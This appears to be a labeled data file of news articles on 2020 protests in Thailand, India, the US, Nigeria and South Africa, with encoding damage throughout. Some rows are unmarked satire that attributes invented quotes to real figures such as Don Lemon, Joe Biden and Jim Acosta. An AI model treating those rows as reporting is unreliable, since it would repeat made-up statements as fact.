parts of northeastern Portland, said last week that the protests have persisted all summer because police officers are ""not being held sufficiently accountable"" for their ""destructive, dangerous, and violent acts.""

1,"Discover Thomson Reuters By Patpicha Tanakasempipat, Matthew Tostevin 4 Min Read BANGKOK (Reuters) - Tens of thousands of people joined Thailandâ€™s biggest protest in years on Saturday, cheering calls to curb the powers of King Maha Vajiralongkornâ€™s monarchy and for the removal of former coup leader Prayuth Chan-ocha as prime minister. â€œUnless the monarchy is under the constitution, we will never achieve true democracy,â€ protest leader and human rights lawyer Arnon Nampa told the crowd gathered within sight of the Grand Palace in central Bangkok. â€œMore, more,â€ the crowd chanted after Arnon called for cuts to the royal budget and changes to the constitution to bring the king clearly under its control. The Royal Palace was not available for comment on the protest and the demands for reform. â€œPeople can protest but they should do that peacefully and within the law,â€ said government spokesman Anucha Burapachaisri when asked to comment. Arnon said protesters would on Sunday declare â€œthe country belongs to the people, not the monarchyâ€ and place a commemorative brass plaque, echoing the words of the leaders of the 1932 upheaval that ended absolute monarchy. Protests that have been building in the southeast Asian country of 70 million since mid-July have broken a long-standing taboo by criticising the monarchy as well as seeking a new constitution and elections. Related Coverage  Thai authorities have said criticising the monarchy is unacceptable in a country where the king is constitutionally â€œenthroned in a position of revered worshipâ€. Lese majeste laws mean those insulting the monarchy can be jailed. â€œDONâ€™T TALK ABOUT THE KINGâ€ Conservatives are horrified by attacks on the monarchy. â€œYou can drive out the prime minister, but donâ€™t talk about the king,â€ commented one Facebook user as speeches were broadcast live from the protest. Reuters reporters estimated there were at least 30,000 people in the demonstration. Organisers said there were more than 50,000, while police said there were 18,000, still enough to make it the biggest since Prayuth took power in a 2014 coup. Protesters have said they plan to march to Government House on Sunday morning. The king was not in Thailand and has spent much of his time in Europe since taking the throne from his late father in 2016. Speakers at the protest criticised the king for his absence and for his personal behaviour, comments that until recently would not have been made in public. â€œThe people are humans, not dust under your royal feet,â€ student leader Panusaya Sithijirawattanakul told the protest early on Sunday. â€œThe people want a king who protects democracy, not one who betrays the peopleâ€™s democracy.â€ The military, which proclaims itself the defender of the monarchy and national stability, has carried out several bloody crackdowns on protesters since the end of absolute monarchy in 1932 as well as 13 successful coups. Sept. 19 is the anniversary of the coup against the populist then-prime minister Thaksin Shinawatra in 2006. Among the protesters were many of his red shirt followers, veterans of clashes a decade ago with pro-establishment yellow shirts. â€œIâ€™m here to fight for the future of my children and grandchildren. I hope that by the time I die, they will become free,â€ said 68-year-old Tasawan Suebthai, a redshirt with amulets round her neck which she hoped would ward off bullets. The latest protests have been peaceful so far, but more than a dozen protest leaders have been arrested and released on bail. None has been charged under the lese majeste laws which protesters want scrapped. They also seek to reduce the kingâ€™s constitutional powers and his control over the palace fortune and units of the army.

1,"Bhim Army chief Chandrashekhar Azad says they will continue to fight over UP woman's rape. (File) Bhim Army chief Chandrashekhar Azad, who was accompanying the family of the 19-year-old Dalit woman, who died after being gang raped in Uttar Pradesh, from Delhi to Hathras said on Wednesday that he was detained by Uttar Pradesh police midway and has now been put under house arrest in Saharanpur. ""The whole world saw how our sister was cremated at night in the absence of the family and without their consent, in connivance of the government and the police. The morality of these people is dead. I was detained by their police the night before and now I have been put under house arrest in Saharanpur. But we will fight,"" Mr Azad tweeted in Hindi. He also shared a picture of the notice issued to him by the Saharanpur police, which stated: ""You are being informed that CrPC section 144 is imposed in the district. There are credible inputs that your tours and acts are gathering crowds, which may lead to law and order situation. Any untoward incident may happen. Hence, you are being informed that you will stay in your house only."" The order, issued by the local Fatehpur police station in-charge Manoj Chaudhary, also warned Mr Azad of legal action for violating the instruction. Mr Chaudhary said it was not a ""house arrest"" but Mr Azad has been asked to remain at his home in view of the law and order situation. ""There is no time limit on the order as such,"" he added. According to functionaries of the Azad Samaj Party, which was launched by the Bhim Army chief in March, Azad and Delhi unit head Himanshu Balmiki had gone missing after 10 pm on Tuesday while they were on their way to Hathras, accompanying the family of the woman, who died in a Delhi hospital on Tuesday. The Azad Samaj Party and affiliates of the pro-Dalit Bhim Army, among others, had joined the protests outside Safdarjung hospital in the national capital on Tuesday to demand justice for the gangrape victim and her family. ""There is no clue about the location of Chandrashekhar Azad and Himanshu almiki after they reached the Jewar toll plaza to get on the lane to Tappal, Aligarh,"" Azad Samaj Party's core committee member Ravindra Bhati said earlier on Wednesday. He alleged that Mr Azad and Himanshu Balmiki were detained during the intervening night of Tuesday and Wednesday, but the police were not making it public. The body of the woman was cremated in Hathras in the early hours of Wednesday, with her family members alleging that the local police forced them to perform the last rites in the dead of the night. Local police officers, however, said that the victim was cremated ""according to the wishes of the family"". Around 12:30 pm on Wednesday, dozens of Azad Samaj Party and Bhim Army activists reached the Tappal police station in Aligarh and staged a demonstration. ""A delegation of our representatives will be meeting senior police and administration officials to inquire about Azad and Balmiki,"" Bhati told the protesters inside the Tappal police station compound. A senior Aligarh police official said: ""I have no idea about this (detention) claim.""  The district police chief and some other senior officers could not be contacted as according to another police official, they have been infected with the coronavirus and are under medication for the last three-four days.

1,"The overwhelming majority of demonstrations this summer were peaceful, according to a new report, which also warns that the upcoming election and President Donald Trumpâ€™s incendiary rhetoric â€” which has placed an outsized focus on the relatively few violent protests â€” could plunge the country into further crisis. The report, published Thursday, is from the U.S. Crisis Monitor, a collaboration between the Armed Conflict Location & Event Data Project (ACLED) and Princeton Universityâ€™s Bridging Divides Initiative, which collects and analyzes real-time data on protest movements, using news reports, social media and other sources. â€œThese data reveal that the United States is in crisis. It faces a multitude of concurrent, overlapping risks â€” from police abuse and racial injustice, to pandemic-related unrest and beyond â€” all exacerbated by increasing polarization,â€ the researchers wrote, warning that â€œthese intersecting risks are likely to intensifyâ€ as the November election draws closer. The report covers data gathered on protests between May 24, the day before police in Minneapolis killed George Floyd, and Aug. 22. During that period, the researchers collected more than 10,600 demonstration events across the country, with more than 7,750 of them related to the Black Lives Matter movement. The protests peaked in late May and early June, and while they have leveled off since, activists in many places across the country continue to hold largely peaceful demonstrations every day. The overwhelming majority of the protests â€” more than 10,100 â€” involved peaceful protesters, the researchers found. In only about 5%, or under 570 of the protests, did participants engage in violence. â€œThe vast majority of demonstration events associated with the BLM movement are non-violent,â€ the researchers wrote. â€œIn more than 93% of all demonstrations connected to the movement, demonstrators have not engaged in violence or destructive activity.â€ In the protests that became violent, they either involved state-sanctioned violence, such as violent intervention from local, state or federal authorities, or counterprotesters from extremist groups. The police or military â€œdisproportionately used force while intervening in demonstrations associated with the BLM movement, relative to other types of demonstrations,â€ the researchers found. According to their data, in nearly 10% of BLM protests recorded this summer, police violently intervened by deploying tear gas, rubber bullets and/or pepper spray, as well as assaulting protesters with batons. During this period, the researchers also found an uptick in â€œgovernment violence against journalists,â€ collecting over 100 separate incidents in at least 31 states and the District of Columbia. As for why public opinion polling suggests that people think a disproportionate number of the protests were violent when in fact they were not, the report attributes those perceptions to respondentsâ€™ existing political views, media coverage of violent protests and disinformation campaigns on social media. The report stresses the gravity of the situation, as the sources of this uprising â€” from racial inequities, to continued police violence, and of course, the COVID-19 pandemic â€” are continuing. It warns that the upcoming election and Trumpâ€™s consistent attempts to sow discord and cast doubt on the election results will exacerbate these forces, citing â€œmultiple steps to inflame these tensionsâ€ from Trump and his administration. Trump has made much of his re-election campaign about â€œlaw and order,â€ with an outsized focus on the relatively few violent protests, racist appeals to white voters and false conspiracy theories about voting by mail. â€œIn this hyper-polarized environment, state forces are taking a more heavy-handed approach to dissent, non-state actors are becoming more active and assertive, and counter-demonstrators are looking to resolve their political disputes in the street,â€ the researchers wrote. â€œWithout significant mitigation efforts, these risks will continue to intensify in the lead-up to the vote, threatening to boil over in November if election results are delayed, inconclusive, or rejected as fraudulent.â€ Read the full report here.

1,"PORTLAND, Ore. (AP) â€” People gathered for Black Lives Matter rallies Saturday evening in Portland, Oregon, and a memorial was held for the man fatally shot last weekend after a right-wing caravan went through downtown, as daily demonstrations stretched well past the three-month mark in the city. Hundreds of people gathered in a park just north of Portland in Vancouver, Washington, for a memorial service for Aaron â€œJayâ€ Danielson, a supporter of a right-wing group called Patriot Prayer, who was killed Aug. 29. The suspect was himself shot and killed by police Thursday. Families showed up at the event with their kids, lining up for the free BBQ and picnicking on the grass at Esther Short Park. As various speakers addressed the audience on stage, attendees waved their flags enthusiastically, occasionally breaking out into chants of â€œU-S-A!â€ Many of the crowd were President Donald Trump supporters, wearing MAGA hats and shirts or holding Trump-Pence flags. Some also waved flags and wore T-shirts showing support for the police. Some attendees also wore T-shirts with â€œJustice for Jâ€ that were handed out at the event. Several local members of Proud Boys, a far-right group that has been involved in skirmishes at local protests, attended. â€œWe honor a man who died for what he believed in,â€ said James Johnson, who has been a member of the Proud Boys for two years. Johnson, who is Black, said he disagreed with people who label the group as a white supremacist organization. The crowded regularly erupted in boos with any mention of Portland Mayor Ted Wheeler and Oregon Gov. Kate Brown, whom Patriot Prayer founder Joey Gibson demanded apologize to Danielsonâ€™s family because they felt he had been unfairly portrayed. â€œThis is about truth and lies,â€ Gibson said. â€œJay was not a white supremacist.â€ Authorities released additional court documents late Friday detailing the moments before Danielsonâ€™s slaying. The documents included shots of security footage that showed the suspect, Michael Forest Reinoehl, ducked into a parking garage and reached toward a pocket or pouch at his waist before emerging to follow the victim. Danielson was holding bear spray and an expandable baton and had a loaded Glock handgun in a holster at his waist, according to the documents. Authorities have said they believe Reinoehl, who was fatally shot by law enforcement officers late Thursday in Washington state, killed Danielson. Witnesses told police that just before they heard gunshots someone said something like, â€œwanna go,â€ which is frequently a challenge to a fight. Danielson, 39, was shot in the chest and died at the scene. The court documents were filed to support second-degree murder charges against Reinoehl, who was a supporter of antifa â€” shorthand for anti-fascists and an umbrella description for the far-left-leaning militant groups that resist neo-Nazis and white supremacists at demonstrations and other events. Demonstrations in Portland started in late May after the police killing of George Floyd in Minneapolis. They have often been marked by vandalism and violence. Black Lives Matter rallies were taking place in the city Saturday evening and night, and BLM supporters drove vehicles through the city earlier Saturday. At one event Saturday afternoon, people stenciled names on a pathway of Black people killed by police. Late Friday protests continued into early Saturday in Portland, with police declaring an unlawful assembly and arresting 27 people. A few hundred demonstrators had met at Kenton Park Friday before making their way to the Portland Police Association building, where officers warned protesters to stay off the streets and private property. Those who refused could be subject to citation, arrest, the use of tear gas, crowd-control agents or impact munitions, police said. The Portland Police Bureau issued a statement Saturday morning saying some officers reported that rocks, a full beverage can and water bottles had been thrown at them, prompting police to declare the gathering an unlawful assembly. Police said one woman who was detained was bleeding from an abrasion on her head, and she was treated by medics at the scene before being transported by an ambulance. The Portland Police Bureau said she jumped out of the ambulance and ran away before it left the scene, however. Most of those arrested were arrested on suspicion of interfering with a peace officer or disorderly conduct, police said. ___ This story has been corrected to reflect that Michael Forest Reinoehl was killed by law enforcement officers, not federal agents. ___ Ding reported from Vancouver, Washington.  .

1,"CNN is now reporting that the mostly peaceful demonstrations for racial justice are all Donald Trumpâ€™s fault because theyâ€™re violent riots serving no purpose at all. In the cable networkâ€™s latest news show, Preposterous Sources, a Volkswagen pulls up and dozens of CNN commentators amazingly yet hilariously pour out onto the set and begin denouncing Trump for the violence that isnâ€™t happening in the mostly peaceful cities that are burning down for some reason that is Trumpâ€™s fault. After gleefully honking his red rubber nose, Don Lemon told his viewer, â€œLet me pretend to be clear. These cities you see where innocent people are brutalized â€” this is Donald Trumpâ€™s America â€” or at least those parts of Donald Trumpâ€™s America that are governed by Democrats and thatâ€™s why theyâ€™re mostly peaceful.â€ â€œAnd Iâ€™m very serious about this as you can tell from the faint moistness in my eyes, which I feel gives me the sensitive look of a graceful doe in a peaceful forest glade,â€ Lemon added. â€œBut perhaps thatâ€™s beside the point.â€ Joe Biden has also emerged from his basement to praise the mostly peaceful protests that are actually riots that are Trumpâ€™s fault, so he denounces them. Speaking to a broom closet he mistook for a meeting of very thin people re-enacting the Bride of Frankenstein, Biden said, â€œCâ€™mon, man! These are people. When I look at them I see the whole history of a kind of thing that we need to do better because do I look like someone who would support radical leftists like my good friend Bernie Sanders or my running mate Kamala Harris? I mean, who do you think I am?â€ â€œNo really, who DO you think I am, because I canâ€™t remember,â€ Biden said. â€œAnd while youâ€™re at it, where do you think I live, because Iâ€™d like to get back in the basement.â€ Biden then declared victory in the election and resigned the presidency, which would make Kamala Harris the first woman of color ever to become president in an old manâ€™s imagination.

1,"SEATTLE â€” Investigators with Seattleâ€™s Office of Police Accountability say officers did not intentionally target a young boy when they hit him in the face with pepper spray during a protest. Video of the boy crying, with milk running down his face to lessen the effects of the spray, went viral after the May 30 protest and led to 13,000 complaints filed with OPA.

In response, the protester ducked, causing the pepper spray to inadvertently affect the boy and his father.â€ >>RAW: Family of 7-year-old who was pepper-sprayed during Seattle protest speaks out OPA investigators found the sergeant who used the spray followed SPD policy in response to the protesterâ€™s actions, and investigators say their review of the body cameras worn by officers showed the sergeant was not able to see the child. After the incident, many people on social media claimed to identify the officer who used the pepper spray. Scroll down to continue reading But OPA investigators found the complainants identified the wrong officer, and that the pepper spraying was actually done by a sergeant. In another incident caught on camera, OPA investigators found an officerâ€™s use of force was â€œimproper and inconsistent with SPD policy and trainingâ€ when he placed his knee on a personâ€™s neck during an arrest for 13 seconds. That case is currently before Interim Chief Adrian Diaz for discipline. OPA received a total of 19,000 complaints regarding officer conduct during protests after the police killing of George Floyd in Minneapolis. Most of the complaints referred to the same incidents and the civilian-led oversight office is currently reviewing about 100 cases. The following statement was released on behalf of the Avery family, whose boy was pepper sprayed: â€œWe are deeply disappointed, but not surprised, by the result reached by the OPA. Today, they have confirmed that it is the Seattle Police Departmentâ€™s position that the use of pepper spray in an intentional and reckless manner that it would strike an innocent child exercising their First Amendment rights is â€œwithin policy.â€ We understand the OPA has said it is â€œsorryâ€ for these actions. But â€œsorryâ€ and â€œregretâ€ is not sufficient. We demand change. OPA did not address the whether the officers could have ta steps to prevent this from happening and, even further, no police officers attempted to render aid to the child making any apology tough to accept. Moreover, the OPA reached its conclusions by analysis and discussion of body camera footageâ€”tapes that were not provided to the family or their legal counsel before today. The OPAâ€™s also refuses to identify the officers who used force in this incident. All of this undermines the claims of objectivity and transparency that the City purports to value. We continue to demand change, and this confirms that it is still deeply needed because the City of Seattle continues to remain indifferent to the suffering its police, and other City officials, have caused to black and indigenous people of color for decades, including the Avery family.â€ More news from KIRO 7 DOWNLOAD OUR FREE NEWS APP Cox Media Group Â© 2021 Cox Media Group.

1,"CHANNELS TELEVISION Advertisement   The Inspector-General of Police, Mohammed Adamu, has dissolved the infamous subunit of the force, the Special Anti-robbery Squad (SARS). â€œThe Special Anti-Robbery Squad of the Nigerian Police, otherwise known as SARS, is hereby dissolved across all formations, the 36 state police command and the Federal Capital Territory where they currently exist,â€ the IGP said on Sunday. â€œAll officers and men currently serving in the unit are to be redeployed with immediate effect.â€ The police authorities will be announcing new policing arrangements to address the offences of armed robbery and other violent crimes that fall within the mandate of the Special Anti-Robbery Squad later. Adamuâ€™s announcement followed days of widespread protests by Nigerians demanding scrapping of the unit which had gained notoriety for brutality and human rights violations.   Beyond scrapping the unit, he acknowledged reports of extortion and brutality, announcing a plan for an investigation. â€œTo deal with the reports of crimes committed against citizens an investigation team will be constituted which will include civil society organisations for transparency and the culprits will be punished,â€ he said.  Read Also: #EndSars: Young Nigerian Jimoh Isiaq Killed In Ogbomosho, Seven Others Injured     The IGP did not give details of the time range the investigation will cover and whether it would include the harassment, threats and violence protesters suffered during the #EndSARS protest, including the killing of a young Nigerian Jimoh Isiaq in Ogbomoso on Saturday. Witnesses said Isiaq was shot by the police. In contrast with the action of the police including the use of tear gas on protesters and the shooting witnessed, the IGP described the protests â€œas a manifestation of the natural desires of citizens to participate in matters concerning policing and internal security in the nationâ€. To better relations between the public and the police, the IGP also announced â€œa citizens and strategic (stake)holders forum will be formed to regularly interface with the leadership of the police at all levels and advice on police activitiesâ€.  #IGPDissolvesSARS pic.twitter.com/A1TvvefbOu â€” Nigeria Police Force (@PoliceNG) October 11, 2020    The unit was founded in 1992 to combat cases of armed robbery, kidnapping, and other violent crimes. But SARS, instead, over time, has gained notoriety for its reckless intimidation of innocent civilians through puerile profiling and wanton abuse of power. Calls for the unitâ€™s disbandment date as far back as 2017 and while the Federal Government and police chiefs have made several pledges to implement reforms, reports of SARSâ€™ brutal activities against civilians have not abated. The current wave of protest can be traced to October 3, after another report of extra-judicial killing in Delta State (the police have denied any killing took place). It sparked fresh concerns and anger. Fuelled by this, and the outpouring of tales of traumatic experiences at the hands of officials of the unit, many Nigerians have held protests in many states, including Lagos, the Federal Capital Territory, Kaduna, Osun, Edo, and Imo.   RELATED LIVE: #EndSARS Protests Continue, Gain Momentum #EndSARS: Reps Unveil 30-Day Plan To Tackle Police Brutality   The Speaker House of Representatives, Honourable Femi Gbajabiamila, has also unveiled some of the plans by the House, aimed at tackling police brutality in the country. In a statement signed personally on Wednesday, Gbajabiamila said over the next 30 days, the House will work with the Nigeria Bar Association (NBA), civil society and with Nigerians of good conscience to draft new legislation that establishes a system of independent accountability from the Force. According to him, the new legislation will hold erring members of the Police Force to account for their conduct in the performance of their duties and impose civil and criminal liability for violations of the Police Code. It will also compel the Nigeria Police Force (NPF) to take responsibility for the failures of training and discipline that leads to such violations. Advertisement"

1,"NEW YORKâ€”In a nation mired in a deadly pandemic, mass civilian street actions, widespread environmental degradation, and collapsing institutions under the fourth year of Donald Trumpâ€™s presidency, it had become clear to sources Friday that Bob Dylan was not exactly rising to the occasion as far as his current protest music goes. â€œSeriously, weâ€™re in this terrible moment full of awful crises and wanton violence, which really should be easy fodder for even a half-decent protest singer, and here Bob Dylan canâ€™t even get his shit together for a three-minute tune,â€ sources said, adding that apparently the so-called Voice of a Generation couldnâ€™t cobble together at least one extended metaphor that fiercely and poetically captured the current situation for a 2020 audience. â€œWe gave you a Nobel Prize for Literature, and for what? So you can release some esoteric 17-minute song about the Kennedy assassination in goddamn March and call it a day? Weâ€™re still droning people in half a dozen countries, for Christâ€™s sake. Look, you have a lot of options hereâ€”some sparsely instrumented yet grand statement that perfectly summarizes the current maelstrom of blame and chaos like â€˜Blowinâ€™ In The Windâ€™ or â€˜The Times They Are A-Changinâ€™â€™ would be ideal, obviously, but if you would rather hone in on some specific episode of social injustice that serves as a microcosm of a commentary on systemic issues, like â€˜Hurricaneâ€™ or â€˜The Lonesome Death Of Hattie Carroll,â€™ that works too. Your lyrics donâ€™t even rhyme. All you have to do is sit down with a guitar and just poignantly and pointedly attack the actions of the Trump administration, or really any other aspect of our present moment. Itâ€™s not like weâ€™re lacking for subject matter. Jesus, Bob, get your shit together.â€ Sources added that they would give Dylan the rest of the month to release something as galvanizing and timelessly true as â€œMasters Of War.â€"

The Special Adviser to Governor Godwin Obaseki on Media, Crusoe Osagie, told Channels Television that the hoodlums exchanged fire with security operatives at the Maximum prison in Benin City. â€œThe hoodlums are currently exchanging fire with the security personnel at the Maximum security prison in Oko, Benin City,â€ Osagie told Channels Television.   The hoodlums can be seen in videos invading the Benin Medium security prison on Sapele Road, releasing some inmates. Three police stations were reported to have been burnt by the hoodlums. Some of the police stations affected include the Ugbekun and Idogbo Police Stations in Ikpoba Okha Local Government Area of the state.

Using the #EndSWAT hashtag on the social media platform, Twitter, the protesters believe the new arm of the police would be no different from the disbanded SARS.

WASHINGTON, D.C.â€”The media is scratching their heads today after thousands of angry Trump supporters descended on the capital and were completely peaceful throughout the entire demonstration. ""I don't even know what this is. This is really confusing,"" said D.C. correspondent Cork Dorgen. ""We've seen violent protests and mostly-peaceful protests, but this protest seems all-the-way peaceful and we didn't even know that was a thing."" According to witnesses, a crowd of hundreds of thousands of people peacefully marched while waving flags, singing the National Anthem, and proclaiming their love for the country and the president. Media outlets in turn have condemned the march as ""physically peaceful, but morally violent."" According to several reports, demonstrators were seen wearing shirts with violent and triggering patriotic messages. One reporter witnessed a high-schooler in a MAGA hat smirking very violently at him. ""While we didn't see physical violence here today, we heard violent speech, violent ideas, and violent singing. These people are basically violent,"" said CNN reporter Jim Acosta. ""If they are not stopped, they may violently stop watching news from trusted sources like CNN or violently expose corruption in Joe Biden's administration."" Reporters were even more horrified when it was revealed that 92% of the crowd was planning to violently attend church services and violently sing hymns the next day in spite of the pandemic.

1,"InfoWars host Alex Jones showed up at the Maricopa County Recorderâ€™s office Thursday night for a second night of protests by Trump supporters, as election workers continued to count ballots late into the night in a state that will ultimately be decided by a narrow margin. Jones was given a heroâ€™s welcome by the crowd of hundreds of Trump supporters outside of the election office in Phoenix. â€œWe donâ€™t know how this is going to end, but if they want a fight, they better believe theyâ€™ve got one,â€ Jones said through a megaphone, while wearing a bulletproof vest. â€œAnd weâ€™re gonna win.â€ â€œWeâ€™re going to take it to the scumbag Nazi bastards,â€ Jones said. â€œThey will be hiding.

On Thursday, sheriffâ€™s deputies reportedly asked the crowd to move off the streets, and then demonstrators prayed for a â€œfair and honest election.â€ As the Arizona vote has continued to be counted to determine the stateâ€™s 11 electoral votes, Trump has drastically cut into Bidenâ€™s once-sizable lead. A big drop of newly counted votes in Maricopa and other counties cut Bidenâ€™s advantage to 48,000 votes, although the Associated Press and Fox News have not retracted their election-night calls that Biden won the state. Ultimately, it may be mootâ€”Biden has taken the lead in Georgia and now Pennsylvania, according to CNN, which would seal an Electoral College victory.

1,"By Nomalanga Tshuma Nov 20, 2020 Share this article: Cape Town - â€œI donâ€™t mind dying for my country and what I believe in.â€ This is according to the man who was arrested at the EFF protest on Friday. Despite numerous calls for Brackenfell residents to not engage with EFF protesters during their protest on Friday in the community, a white resident made his way to the front of the EFFâ€™s makeshift stage in the middle of Frans Conradie and allegedly hurled racial slurs and profanities at the crowd while the partyâ€™s general secretary, Marshall Dlamini, was speaking. EFF members responded to the provocation by beating and stomping on the man as he lay screaming at their feet. He was rescued by the police a few minutes later. Police called on the crowd to disperse, which was met with some resistance at first and quickly turned around as the police began firing rubber bullets, throwing stun grenades, released tear gas and utilised water cannon trucks. Police spokesperson FC van Wyk said: â€œOne member of the public was injured after he attempted to disrupt the EFF protest. He was arrested on the scene on a charge of incitement and is also due in court in due course.â€ The injured resident said that he had decided to set the EFF crowd straight after their continuous calls for white people to be done away with. He said: â€œI am willing to die for my country. What the EFF are saying and doing here is wrong. South Africa is for all who live in it regardless of race and culture. Both Afrikaans people and black people belong here, and I had to let them know that.â€ Meanwhile, a few metres away, dispersing protesters began throwing rocks and sticks in retaliation at police officers and law enforcement, vandalising a few businesses, private vehicles and state vehicles, as well as setting alight open fields in the community and surrounding areas. Van Wyk said: â€œThe protest action in Brackenfell necessitated police action to maintain law and to disperse the riotous crowd. Eight protestors were arrested on charges of public violence and they are due in court once they have been charged. â€œAs the protesters dispersed, they were throwing stones at all Law Enforcement agencies as well as businesses. Several SAPS, Law Enforcement vehicles, windows of businesses as well as private vehicles were damaged. â€œThe crowd has since dispersed but the situation in the area is still being monitored. Our forces will remain in the area until we are satisfied that the situation has stabilised.â€ Police and some @EFFSouthAfrica members clash in #Brackenfell.#effinbrakenfell#BrackenfellHighSchoolðŸ“¹ @PJikelo / @AfriNewsAgency pic.twitter.com/P549Kjg54F Cape Argus Share this article: Sections on IOL Follow IOL More on IOL Legal Trending on IOL Newspapers Â© 2021 Independent Online and affiliated companies.

1,"Penguin Random House Canadaâ€™s plans to publish a new work by the â€˜professor against political correctnessâ€™ has reportedly prompted numerous complaints Last modified on Thu 21 Jan 2021 11.16 EST The announcement of a new book from Canadian psychologist Jordan Peterson, the self-styled â€œprofessor against political correctnessâ€, has prompted dozens of complaints from staff at his publisher in Canada, according to a report. Viceâ€™s story on Tuesday said that the announcement of Petersonâ€™s forthcoming Beyond Order: 12 More Rules for Life, a follow-up to his global bestseller 12 Rules for Life, prompted â€œseveralâ€ staff at Penguin Random House Canada (PRH Canada) to confront management. Petersonâ€™s views on subjects including transgender rights, gender and race have been controversial. Last year, Cambridge University rescinded its offer of a visiting fellowship to Peterson. Also in 2019, 12 Rules for Life was temporarily pulled from sale in a New Zealand book chain after the terrorist attack on a Christchurch mosque, over perceived links between Petersonâ€™s fanbase and Islamophobia.  At a PRH Canada town hall meeting on Monday, one employee told Vice, â€œpeople were crying about how Jordan Peterson has affected their livesâ€. PRH Canadaâ€™s diversity and inclusion committee reportedly received at least 70 anonymous messages about Petersonâ€™s book from staff, with only â€œa coupleâ€ in favour of the decision to publish. In response, PRH Canada told Vice that it â€œimmediatelyâ€ held the forum after announcing its plans to publish Beyond Order and â€œprovided a space for our employees to express their views and offer feedbackâ€. The publisherâ€™s statement said: â€œOur employees have started an anonymous feedback channel, which we fully support. We are open to hearing our employeesâ€™ feedback and answering all of their questions. We remain committed to publishing a range of voices and viewpoints.â€ Petersonâ€™s daughter Mikhaila tweeted a link to the Vice article. â€œHow to improve business in 2 steps: Step 1: identify crying adults. Step 2: fire,â€ she wrote. â€œIf you donâ€™t think adults willing to cry to get their way in a workplace is a problem â€¦ youâ€™re clearly not in charge of many people.â€ Petersonâ€™s Beyond Order, which is due out in March, promises to deliver â€œ12 more lifesaving principles for resisting the exhausting toll that our desire to order the world inevitably takesâ€. â€œIn a time when the human will increasingly imposes itself over every sphere of life â€“ from our social structures to our emotional states â€“ Peterson warns that too much security is dangerous,â€ says the publisher. â€œWhatâ€™s more, he offers strategies for overcoming the cultural, scientific, and psychological forces causing us to tend toward tyranny, and teaches us how to rely instead on our instinct to find meaning and purpose, even â€“ and especially â€“ when we find ourselves powerless.â€ The Guardian understands that no staff at PRH in the UK have complained about the decision to publish Peterson again. The protests in Canada over Petersonâ€™s book follow Hachetteâ€™s decision to drop Woody Allenâ€™s memoir after a staff walkout, and reports that staff at JK Rowlingâ€™s publisher in the UK were told they could not refuse to work on her new childrenâ€™s book The Ickabog because they disagreed with her views on transgender rights. This article was amended on 21 January 2021 to remove a statement that the offer to Jordan Peterson was rescinded â€œfollowing criticism from faculty and studentsâ€. Cambridge University has informed the Guardian that the decision was made by the Research Committee of the Faculty of Divinity prior to and independently of the receipt of any external comment on the matter by other university staff or students."
1,"CHANNELS TELEVISION Advertisement  The Nigerian Army has insisted that only blank bullets containing gunpowder were fired at the Lekki Tollgate area of Lagos State on October 20. Commander of the 81 Military Intelligence Brigade, Brigadier Ahmed Taiwo, made this known on Saturday when he appeared before the Judicial Panel of Inquiry set up by the state government to investigate cases of police brutality. He also insisted that the military only fired into the air and not directly at the #EndSARS protesters. While explaining that the blank bullets used cannot cause any damage to the flesh, Brigadier Taiwo said if real bullets were indeed fired, one bullet had the potency to kill three persons at one shot.    RELATED: Reports Of Army Searching For DJ Switch â€˜Further From The Truthâ€™ â€“ Brigadier Taiwo Nigerian Army Denies Shooting Protesters, Says Lagos Govt Requested Military Intervention  He reiterated the Armyâ€™s position that they were deployed to the scene on the orders of the state government. While a curfew had been put in place to contain the violence that had broken out in parts of the state by persons who hijacked the peaceful protests, the army said it did not get the update that the timing which had initially been set to commence at 4:00 pm, was shifted to 9:00 pm. Brigadier General Taiwo also maintained that the troops were not only deployed to the Lekki tollgate but also to other areas like Badagry, Ikorodu, Apapa, Alimosho, Epe, Lagos Island and the entire state to restore normalcy. Furthermore, he claimed that after the soldiers left the area, hoodlums went on to destroy the toll gate plaza. Watch Full Video Below   The army had initially described reports of its involvement in the shooting as fake news before admitting to being present at the scene. Viral reports online had insinuated that not only were they present, but they shot at and killed several persons and allegedly hid the bodies. Both the army and the state government have, however faulted the reports, insisting that only two persons had been confirmed dead from the incident. â€œTwo dead bodies. That is what we have seen from all the morgues, that is what we have going to hospitals, that is what we have seen as records,â€ governor Sanwo-Olu had said in an interview with CNN. Advertisement"
1,"Skirmishes break out between rival groups as police fire water cannon and MPs flee in boats Last modified on Tue 17 Nov 2020 23.36 EST Thailandâ€™s riverside parliament was surrounded by chaos as police repeatedly fired water cannon at pro-democracy protesters, clashes broke out between the demonstrators and royalist counterparts, and MPs abandoned the scene in boats. Five people were treated for gunshot wounds, including at least two students, after the most violent clashes since a youth-led movement emerged in July. A total of 55 people suffered injuries in the protests, according to Bangkokâ€™s Erawan emergency medical centre.  For months, a youth-led protest movement has held escalating demonstrations calling for democratic reforms. They have demanded the removal of the prime minister, Prayuth Chan-ocha, a former army general, and have breached longstanding taboos to call for an accountable and transparent monarchy. Dozens have faced legal charges for taking part in the rallies. On Tuesday, as lawmakers considered whether to debate several proposals to amend the constitution â€“ an issue central to protestersâ€™ demands â€“ thousands gathered outside the Thai parliament, which had been blocked off with razor wire and concrete. Protesters outside parliament mocked the military-backed government by bringing giant inflatable ducks to the rally, which some joked would float down the river to an otherwise inaccessible parliament. The ducks, nicknamed by some as their â€œnavy forceâ€, were instead used to shelter from blasts of water cannon, which in some instances contained chemical irritants. Teargas was also used on pro-democracy protesters, who wore hard hats and goggles for protection. Groups of demonstrators could be seen coughing and pouring water over their faces to ease the stinging. â€œStop accusing us of violating the law, you [the police] are violating the law by hurting people,â€ Parit Chiwarak, a prominent student leader also known as Penguin, said through a megaphone later in the evening. â€œWe are fighting for a better future of our country and for everyone so donâ€™t fire water cannon on us.â€ A police spokesman said water cannon were used because protesters were attempting to break into a restricted area. Despite a heavy police presence around parliament, skirmishes broke out between royalists, who wore yellow shirts, and pro-democracy protesters during the afternoon. Both sides threw stones and water bottles after police retreated from one of the barricades, the first major clash between royalists and the student-led movement. Skirmishes occurred again later in the evening, when gunshots were fired. In one video, shared widely on social media and apparently filmed among yellow shirt royalists, a speaker warns the opposing side to control their crowd, and not to throw a firecracker. What sounds like several gunshots are fired. A person close to the camera, far from the front line, watches on saying â€œshoot them, shoot themâ€. Mint Suttawan, an MP for the progressive opposition party Move Forward, told the Guardian she had visited two injured students at Rama 9 hospital. Both had been shot in the leg but were conscious, she said. They had attended the demonstration as protest guards for the pro-democracy movement â€“ volunteers who stand on the front line to manage the crowds and ensure demonstratorsâ€™ safety. Royalists held a counter-demonstration earlier in the day, where they urged lawmakers not to change the constitution. â€œAmending the 